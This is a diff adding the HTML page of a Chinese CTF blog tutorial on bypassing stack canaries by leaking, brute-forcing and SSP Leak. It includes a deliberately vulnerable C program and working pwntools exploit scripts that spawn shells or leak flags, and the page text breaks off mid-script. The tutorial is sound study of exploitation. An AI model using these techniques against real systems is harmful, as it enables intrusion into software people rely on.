@@ -1,0 +1,275 @@
+<!DOCTYPE html>
+<html lang="en">
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="google-site-verification" content="xBT4GhYoi5qRD5tr338pgPM5OWHHIDR6mNg1a3euekI">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="description" content>
+    <meta name="keyword" content>
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>
+        
+        canary保护和常用bypass手段 - 一筐萝卜
+        
+    </title>
+
+    <!-- Custom CSS -->
+    <link rel="stylesheet" href="/css/aircloud.css">
+    <link rel="stylesheet" href="/css/gitment.css">
+    <!--<link rel="stylesheet" href="https://imsun.github.io/gitment/style/default.css">-->
+    <link href="//at.alicdn.com/t/font_620856_pl6z7sid89qkt9.css" rel="stylesheet" type="text/css">
+    <!-- ga & ba script hoook -->
+    <script></script>
+</head>
+
+<body>
+
+<div class="site-nav-toggle" id="site-nav-toggle">
+    <button>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+        <span class="btn-bar"></span>
+    </button>
+</div>
+
+<div class="index-about">
+    <i> 你若盛开，清风自来！ </i>
+</div>
+
+<div class="index-container">
+    
+    <div class="index-left">
+        
+<div class="nav" id="nav">
+    <div class="avatar-name">
+        <div class="avatar radius">
+            <img src="/img/avatar.jpg" />
+        </div>
+        <div class="name">
+            <i>一筐萝卜</i>
+        </div>
+    </div>
+    <div class="contents" id="nav-content">
+        <ul>
+            <li >
+                <a href="/">
+                    <i class="iconfont icon-shouye1"></i>
+                    <span>HOME</span>
+                </a>
+            </li>
+            <li >
+                <a href="/tags">
+                    <i class="iconfont icon-biaoqian1"></i>
+                    <span>TAGS</span>
+                </a>
+            </li>
+            <li >
+                <a href="/archives">
+                    <i class="iconfont icon-guidang2"></i>
+                    <span>ARCHIVES</span>
+                </a>
+            </li>
+            <li >
+                <a href="/about/">
+                    <i class="iconfont icon-guanyu2"></i>
+                    <span>ABOUT</span>
+                </a>
+            </li>
+            
+            <li>
+                <a id="search">
+                    <i class="iconfont icon-sousuo1"></i>
+                    <span>SEARCH</span>
+                </a>
+            </li>
+            
+        </ul>
+    </div>
+    
+        <div id="toc" class="toc-article">
+    <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#简介"><span class="toc-text">简介</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#一、泄露栈中的canary"><span class="toc-text">一、泄露栈中的canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#二、逐位爆破canary"><span class="toc-text">二、逐位爆破canary</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三、SSP-Leak"><span class="toc-text">三、SSP Leak</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#四、劫持-stack-chk-fail函数"><span class="toc-text">四、劫持__stack_chk_fail函数</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#个人感悟"><span class="toc-text">个人感悟</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文献"><span class="toc-text">参考文献</span></a></li></ol>
+</div>
+    
+</div>
+
+
+<div class="search-field" id="search-field">
+    <div class="search-container">
+        <div class="search-input">
+            <span id="esc-search"> <i class="icon-fanhui iconfont"></i></span>
+            <input id="search-input"/>
+            <span id="begin-search">search</span>
+        </div>
+        <div class="search-result-container" id="search-result-container">
+
+        </div>
+    </div>
+</div>
+
+        <div class="index-about-mobile">
+            <i> 你若盛开，清风自来！ </i>
+        </div>
+    </div>
+    
+    <div class="index-middle">
+        <!-- Main Content -->
+        
+
+
+<div class="post-container">
+    <div class="post-title">
+        canary保护和常用bypass手段
+    </div>
+
+    <div class="post-meta">
+        <span class="attr">Post：<span>2019-05-07 22:00:24</span></span>
+        
+        <span class="attr">Tags：/
+        
+        <a class="tag" href="/tags/#pwn" title="pwn">pwn</a>
+        <span>/</span>
+        
+        
+        </span>
+        <span class="attr">Visit：<span id="busuanzi_value_page_pv"></span>
+</span>
+</span>
+    </div>
+    <div class="post-content no-indent">
+        <p>hah</p>
+<a id="more"></a>
+<h3 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h3><p>canary是一种用来防护栈溢出的保护机制。其原理是在一个函数的入口处，先从fs/gs寄存器中取出一个4字节(eax)或者8字节(rax)的值存到栈上，当函数结束时会检查这个栈上的值是否和存进去的值一致</p>
+<p>在32位程序上：<br><img src="https://s2.ax1x.com/2019/05/07/EyZtOO.png" alt><br>在64位程序上：<br><img src="https://s2.ax1x.com/2019/05/07/EyZdTH.png" alt> </p>
+<p>若一致则正常退出，如果是栈溢出或者其他原因导致canary的值发生变化，那么程序将执行___stack_chk_fail函数，继而终止程序<br><img src="https://s2.ax1x.com/2019/05/07/EyZDfI.png" alt> </p>
+<p>可以看出，如果程序开启canary保护，并且不知道canary的值是多少，那么就不能够进行ROP来劫持程序流程</p>
+<p>在GCC中开启canary保护：</p>
+<figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-fstack-protector 启用保护，不过只为局部变量中含有数组的函数插入保护</span></span><br><span class="line"><span class="deletion">-fstack-protector-all 启用保护，为所有函数插入保护</span></span><br><span class="line"><span class="deletion">-fstack-protector-strong</span></span><br><span class="line"><span class="deletion">-fstack-protector-explicit 只对有明确stack_protect attribute的函数开启保护</span></span><br><span class="line"><span class="deletion">-fno-stack-protector 禁用保护.</span></span><br></pre></td></tr></table></figure>
+
+<p>下面详细讲一下绕过手法</p>
+<h3 id="一、泄露栈中的canary"><a href="#一、泄露栈中的canary" class="headerlink" title="一、泄露栈中的canary"></a>一、泄露栈中的canary</h3><p>canary设计是以“\x00”结尾，本意就是为了保证canary可以截断字符串。泄露栈中canary的思路是覆盖canary的低字节，来打印出剩余的canary部分。</p>
+<p>泄露条件：</p>
+<ul>
+<li>存在栈溢出漏洞</li>
+<li>可以将存在于栈上的可控变量进行输出</li>
+</ul>
+<p>Example：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">getshell</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">vuln</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> ooo[<span class="number">100</span>];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">2</span>;i++)&#123;</span><br><span class="line">        read(<span class="number">0</span>, ooo, <span class="number">0x200</span>);</span><br><span class="line">        <span class="built_in">printf</span>(ooo);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span> </span>&#123;</span><br><span class="line">    init();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"Hello radish!"</span>);</span><br><span class="line">    vuln();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">#gcc -m32 -fstack-protector-all filename.c -o filename</span></span><br></pre></td></tr></table></figure>
+
+<p>分析该程序，在vuln函数中存在栈溢出和格式化字符串漏洞</p>
+<p>第一种思路就是利用读入的ooo变量，正好溢出到canary的位置，然后输出的时候，printf就可以把canary的值当做ooo变量的一部分进行输出<br><img src="https://s2.ax1x.com/2019/05/07/EyZy1P.png" alt><br>第二次输入的时候，在payload中将canary的位置填充成刚刚泄露出来的值即可</p>
+<p>exp：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']</span><br><span class="line">r = process(<span class="string">"./test"</span>)</span><br><span class="line">shell_addr = ELF(<span class="string">"./test"</span>).sym[<span class="string">"houmen"</span>]</span><br><span class="line">r.recvuntil(<span class="string">"Hello radish!\n"</span>)</span><br><span class="line">payload = <span class="string">"a"</span>*100</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recvuntil(<span class="string">"a"</span>*100)</span><br><span class="line">canary = u32(r.recv(4))-0x0a</span><br><span class="line"><span class="section">log.info("canary:"+hex(canary))</span></span><br><span class="line">payload =  <span class="string">"a"</span>*100 <span class="comment">#填充</span></span><br><span class="line">payload += p32(canary)<span class="comment">#泄露的canary</span></span><br><span class="line">payload += <span class="string">"a"</span>*8</span><br><span class="line">payload += <span class="string">"aaaa"</span> <span class="comment">#ebp</span></span><br><span class="line">payload += p32(shell_addr) <span class="comment"># ret addr</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>第二种思路就是第一次输入的时候通过格式化字符串漏洞直接将栈上canary打印出来，然后再进行ROP</p>
+<p>利用libformatstr求出偏移量和填充量<br><img src="https://s2.ax1x.com/2019/05/07/EyZcX8.png" alt><br>计算出canary相对于参数的偏移量是（6+25）=31，然后进行ROP</p>
+<p>exp：</p>
+<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">from libformatstr import *</span><br><span class="line">context.log_level = 'debug'</span><br><span class="line">context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']</span><br><span class="line">r = process(<span class="string">"./test"</span>)</span><br><span class="line">shell_addr = ELF(<span class="string">"./test"</span>).sym[<span class="string">"houmen"</span>]</span><br><span class="line">r.recvuntil(<span class="string">"Hello radish!\n"</span>)</span><br><span class="line">debug = 0</span><br><span class="line">if debug:</span><br><span class="line">	bufsiz = 50</span><br><span class="line">	r.sendline(make_pattern(bufsiz))</span><br><span class="line">	data = r.recv() </span><br><span class="line">	offset, padding = guess_argnum(data, bufsiz)</span><br><span class="line">	log.info(<span class="string">"offset : "</span> + str(offset))</span><br><span class="line">	log.info(<span class="string">"padding: "</span> + str(padding))</span><br><span class="line">	exit()</span><br><span class="line">r.sendline(<span class="string">"%31$p"</span>)</span><br><span class="line">canary = eval(r.recv())</span><br><span class="line"><span class="section">log.info("canary:"+hex(canary))</span></span><br><span class="line">payload =  <span class="string">"a"</span>*100 <span class="comment">#填充</span></span><br><span class="line">payload += p32(canary)<span class="comment">#泄露的canary</span></span><br><span class="line">payload += <span class="string">"a"</span>*8</span><br><span class="line">payload += <span class="string">"aaaa"</span> <span class="comment">#ebp</span></span><br><span class="line">payload += p32(shell_addr) <span class="comment"># ret addr</span></span><br><span class="line">r.sendline(payload)</span><br><span class="line">sleep(0.2)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>
+
+<h3 id="二、逐位爆破canary"><a href="#二、逐位爆破canary" class="headerlink" title="二、逐位爆破canary"></a>二、逐位爆破canary</h3><p>在某些pwn题中存在fork函数，且程序开启了canary保护，当程序进入到子进程的时候，其canary的值和父进程中canary的值一样，在一定的条件下我们可以将canary爆破出来；需要必备的条件就是程序中存在栈溢出的漏洞，并且可以覆盖到canary的位置，那么我们就可以把canary一位一位的爆破出来</p>
+<p>拿一道CTF题做例子，已知该程序开启了canary和NX保护</p>
+<p>载入IDA中审计代码发现存在fork函数<br><img src="https://s2.ax1x.com/2019/05/07/EyZR0g.png" alt><br>在sub_80487FA函数中存在栈溢出<br><img src="https://s2.ax1x.com/2019/05/07/EyZvN9.png" alt> </p>
+<p>exp：（测试输出字符串）</p>
+<figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">#coding:utf<span class="number">-8</span></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line">r = process(<span class="string">"pwn2"</span>)</span><br><span class="line"><span class="keyword">file</span> = ELF(<span class="string">"./pwn2"</span>)</span><br><span class="line">libc = ELF(<span class="string">"./libc.so.6"</span>)</span><br><span class="line"><span class="keyword">log</span>.info(<span class="string">"---------------------------条件准备-----------------------------------"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">" puts_plt_addr:"</span>+hex(<span class="keyword">file</span>.plt[<span class="string">'puts'</span>])</span><br><span class="line"><span class="keyword">print</span> <span class="string">" puts_got_addr:"</span>+hex(<span class="keyword">file</span>.got[<span class="string">'puts'</span>])</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"Y"</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.sendline(<span class="string">"radish"</span>)</span><br><span class="line">r.recv()</span><br><span class="line">r.send(<span class="string">"a"</span>*<span class="number">16</span>+<span class="string">"\x00"</span>)</span><br><span class="line"><span class="keyword">log</span>.info(<span class="string">"---------------------------爆破canary-----------------------------------"</span>)</span><br><span class="line">str1 = r.recv()</span><br><span class="line">true_len = <span class="number">46</span></span><br><span class="line">canary = <span class="string">"\x00"</span></span><br><span class="line"><span class="keyword">for</span> x <span class="keyword">in</span> xrange(<span class="number">3</span>):</span><br><span class="line">	<span class="keyword">for</span> y <span class="keyword">in</span> xrange(<span class="number">256</span>):</span><br><span class="line">		r.sendline(<span class="string">"Y"</span>)</span><br><span class="line">		r.recv()</span><br><span class="line">		r.sendline(<span class="string">"radish"</span>)</span><br><span class="line">		r.recv()</span><br><span class="line">		r.send(<span class="string">"a"</span>*<span class="number">16</span>+canary+chr(y))</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">if</span> <span class="string">"&lt;unknown&gt;"</span> <span class="keyword">in</span> r.recvuntil(<span class="string">"[*] Do you love me?[Y]"</span>,drop=True):</span><br><span class="line">			a=<span class="number">123</span></span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			canary = canary+chr(y)</span><br><span class="line">			<span class="keyword">log</span>.info(<span class="string">'At round %d find canary byte %#x'</span> %(x, y))</span><br><span class="line">			r.recv()</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line"><span class="keyword">log</span>.info(<span class="string">"爆破出canary的值为%#x"</span>%(u32(canary)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">log</span>.info(<span class="string">"---------------------------测试canary正确性-----------------------------------"</span>)</span><br><span class="line">r.sendline(<span class="string">"Y"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">r.sendline(<span class="string">"wxm"</span>)</span><br><span class="line"><span class="keyword">print</span> r.recv()</span><br><span class="line">libc_so_6_str_addr = <span class="number">0x0804833D</span></span><br><span class="line">payload = <span class="string">"a"</span>*<span class="number">16</span>+canary+<span class="string">"a"</span>*<span class="number">12</span>+p32(<span class="keyword">file</span>.plt[<span class="string">'puts'</span>])+<span class="string">"aaaa"</span>+p32(libc_so_6_str_addr)</span><br><span class="line">r.sendline(payload)</span><br><span class="line">r.recv()</span><br></pre></td></tr></table></figure>
+
+<p>成功输出：<br><img src="https://s2.ax1x.com/2019/05/07/EyZxhR.png" alt> </p>
+<h3 id="三、SSP-Leak"><a href="#三、SSP-Leak" class="headerlink" title="三、SSP Leak"></a>三、SSP Leak</h3><p>全称是Stack Smashing Protect Leak ，这种方法没办法让我们getshell，但是我们可以利用这种方法获取到内存中的值，比如当flag在内存中储存时，我们就可以利用这个方法来读取flag</p>
+<p>在函数结尾处检查canary时，若canary被改变，则程序在终止之前会执行__stack_chk_fail函数，如下所示：<br><img src="https://s2.ax1x.com/2019/05/07/EyeCjK.png" alt> </p>
+<p>__stack_chk_fail()函数定义如下：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">eglibc-<span class="number">2.19</span>/debug/stack_chk_fail.c</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">__attribute__</span> <span class="params">((noreturn)</span>) <span class="title">__stack_chk_fail</span> <span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __fortify_fail (<span class="string">"stack smashing detected"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">__attribute__</span> <span class="params">((noreturn)</span>) internal_function <span class="title">__fortify_fail</span> <span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *msg)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="comment">/* The loop is added only to keep gcc happy.  */</span></span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    __libc_message (<span class="number">2</span>, <span class="string">"*** %s ***: %s terminated\n"</span>,</span><br><span class="line">                    msg, __libc_argv[<span class="number">0</span>] ?: <span class="string">"&lt;unknown&gt;"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当程序中存在栈溢出，并且溢出的长度可以覆盖掉程序中argv[0]的时候，我们可以通过这种方法打印任意地址上的值，造成任意地址读。</p>
+<p>更深一步的讲，对于linux，fs段寄存器实际指向的是当前栈的TLS结构，fs:0x28指向的正是stack_guard</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">                       thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure>
+
+<p>如果存在溢出并且可以覆盖位于TLS中保存的canary值，那么就可以实现绕过保护机制</p>
+<p>TLS中的值由函数security_init进行初始化</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> <span class="keyword">void</span></span><br><span class="line">security_init (<span class="keyword">void</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">// _dl_random的值在进入这个函数的时候就已经由kernel写入.</span></span><br><span class="line">  <span class="comment">// glibc直接使用了_dl_random的值并没有给赋值</span></span><br><span class="line">  <span class="comment">// 如果不采用这种模式, glibc也可以自己产生随机数</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//将_dl_random的最后一个字节设置为0x0</span></span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_chk_guard = _dl_setup_stack_chk_guard (_dl_random);</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 设置Canary的值到TLS中</span></span><br><span class="line">  THREAD_SET_STACK_GUARD (stack_chk_guard);</span><br><span class="line"></span><br><span class="line">  _dl_random = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//THREAD_SET_STACK_GUARD宏用于设置TLS</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> THREAD_SET_STACK_GUARD(value) \</span></span><br><span class="line">  THREAD_SETMEM (THREAD_SELF, header.stack_guard, value)</span><br></pre></td></tr></table></figure>
+
+<p>同样拿一道CTF题做例子（GUESS）来演示利用方式，该程序开启了canary和NX保护</p>
+<p><img src="https://s2.ax1x.com/2019/05/07/EyeugP.png" alt> </p>
+<p>程序先把flag读入到栈上，然后利用gets函数进行三次读入，这里可以进行三次栈溢出，然后利用SSP Leak将flag打印出来</p>
+<p>首先找到argv[0]的地址，计算出偏移量，用gdb加载程序，在栈很高的地址上可以看到，它默认指向文件名<br><img src="https://s2.ax1x.com/2019/05/07/Eye1Hg.png" alt><br>在gdb中调试出，我们输入的字符串s2在 “rbp-0x40”处，flag在”rbp-0x70处”，从而计算出能够覆盖掉argv[0]的偏移是0x128</p>
+<p>根据第一次泄露出的puts函数的真实地址，计算出libc基地址</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">payload</span> = <span class="string">'a'</span>* <span class="number">0</span>x128 + p64(<span class="number">0</span>x602020)*<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+<p>第二次泄露的_environ，也就是真实栈的地址</p>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">environ_addr</span> = libc_base + libc.symbols[<span class="string">'_environ'</span>]</span><br></pre></td></tr></table></figure>
+
+<p>在linux应用程序运行时，内存的最高端是环境/参数节（environment/arguments section），用来存储系统环境变量的一份复制文件，进程在运行时可能需要。</p>
+<p>例如，运行中的进程，可以通过环境变量来访问路径、shell 名称、主机名等信息。<br>该节是可写的，因此在格式串（format string）和缓冲区溢出（buffer overflow）攻击中都可以攻击该节。</p>
+<p>*environ指针指向栈地址(环境变量位置)，有时它也成为攻击的对象，泄露栈地址，篡改栈空间地址，进而劫持控制流。环境表是一个表示环境字符串的字符指针数组，由”name=value”这样类似的字符串组成,它储存在整个进程空间的的顶部，其中value是一个以”\0″结束的C语言类型的字符串，代表指针该环境变量的值,一般我们见到的name都是大写，但这只是一个惯例</p>
+<p>我们需要泄漏出栈的地址，才能泄漏出flag，而_environ存着栈的地址，所以我们需要泄漏_environ</p>
+<p>第三次通过之前计算的偏移，直接泄露flag</p>
+<p>完整exp：</p>
+<figure class="highlight sqf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn import *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context.terminal = [<span class="string">'deepin-terminal'</span>, <span class="string">'-x'</span>, <span class="string">'sh'</span> ,<span class="string">'-c'</span>]</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./GUESS.'</span>)</span><br><span class="line">puts_got = <span class="number">0</span>x602020</span><br><span class="line"><span class="meta">#leak libc</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0</span>x128 + p64(puts_got)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">puts_addr = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">'puts addr : 0x%x'</span> %puts_addr)</span><br><span class="line"><span class="meta">#gdb.attach(p)</span></span><br><span class="line">offset_puts = <span class="number">0</span>x6f690</span><br><span class="line">libc_base = puts_addr - offset_puts</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">'libc base addr : 0x%x'</span> %libc_base)</span><br><span class="line"></span><br><span class="line">addr__environ = <span class="number">0</span>x3c6f38</span><br><span class="line"><span class="variable">_environ_addr</span> = libc_base + addr__environ</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">'_environ addr : 0x%x'</span> %addr__environ)</span><br><span class="line"></span><br><span class="line"><span class="meta">#leak environ</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing flag\n'</span>)</span><br><span class="line">payload = <span class="string">'a'</span>*<span class="number">0</span>x128 + p64(<span class="variable">_environ_addr</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recvuntil(<span class="string">'detected ***: '</span>)</span><br><span class="line">stack_base = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">0</span>x198</span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">'stack base addr : 0x%x'</span> %stack_base)</span><br><span class="line">flag_addr = stack_base + <span class="number">0</span>x30</span><br><span class="line"></span><br><span class="line"><span class="meta">#leak flag</span></span><br><span class="line">p.recvuntil(<span class="string">'guessing 